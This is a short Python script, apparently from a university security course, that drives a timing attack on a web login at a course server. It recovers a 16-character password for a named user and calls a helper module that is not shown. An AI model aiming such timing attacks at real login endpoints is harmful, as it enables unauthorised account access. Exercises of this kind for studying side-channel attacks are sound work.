import Utils

passwords = []

for i in range(10):
    difficulty = 0
    username = "adirbir"
    username = "avivams"
    username = "curiey"

    start_url = f"aoi.ise.bgu.ac.il/?user={username}&password="
    end_url = f"[&difficulty={difficulty}]"

    password = Utils.timing_attack(start_url=start_url, end_url=end_url, password_size=16)

    if password:
        print(f"found password: {password}  !")
    else:
        print("couldn't find password")
    passwords.append(password)

print(passwords)
